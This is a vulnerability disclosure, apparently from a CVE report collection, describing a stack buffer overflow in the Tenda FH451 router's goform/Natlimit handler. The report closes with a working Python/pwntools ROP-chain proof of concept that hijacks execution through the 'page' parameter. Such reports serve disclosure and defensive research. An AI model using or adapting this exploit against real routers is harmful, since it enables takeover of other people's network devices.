# Shenzhen Jixiang Tengda Technology Co., Ltd. FH451 has a Remote Code Execution vulnerability

**Vulnerability URL**: [http://0.0.0.0:80/goform/Natlimit](http://0.0.0.0:80/goform/Natlimit)

**Firmware Download Link:** [https://www.tenda.com.cn/material/show/1629](https://www.tenda.com.cn/material/show/1629)

## Vulnerability Analysis
The vulnerability occurs in the `fromNatlimit` function.

![Image 1](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/Natlimit1.png)

The program retrieves the user input parameter `page` at line 11 but does not perform any size check. When the parameter value is excessively large, it will causes a stack overflow in the `sprintf` function at line 12, which can lead to a program crash or potential exploitation.  
Cross-referenced location: from the `fromNatlimit` function, routed to `Natlimit`, at line 48.
![Image 2](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/Natlimit2.png)

Further cross-referenced to the `sub_64EAC` function, with attention to lines 44 and 47.
![Image 3](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/fromAddressNat3.png)

It can be determined that the vulnerability occurs at the page path `goform/Natlimit`.

## payload
```python
import requests
from pwn import *

libc = ELF('./squashfs-root/lib/libc.so.0')
system_offset = libc.symbols["system"]
base = 0x3fe36000

system_addr = base + system_offset
puts = base+libc.symbols['puts']
str = b"hello-I-am-fzz\x00"
mov_r0 = base+0x00040cb8 # mov r0, sp; blx r3;
pop_r3 = base+0x00018298 # pop {r3, pc};
payload = b'a'*255 + p32(pop_r3)+p32(puts)+p32(mov_r0)+str

IP = '0.0.0.0:80'
url = f"http://{IP}/goform/Natlimit"

data = {
    "page": payload
}
ret = requests.post(url,data=data)
```

# reproduce
![Image 4](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/Natlimit4.png)
![Image 5](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/Natlimit5.png)
![Image 6](https://github.com/zezhifu1/cve_report/blob/main/FH451/image/Natlimit6.png)
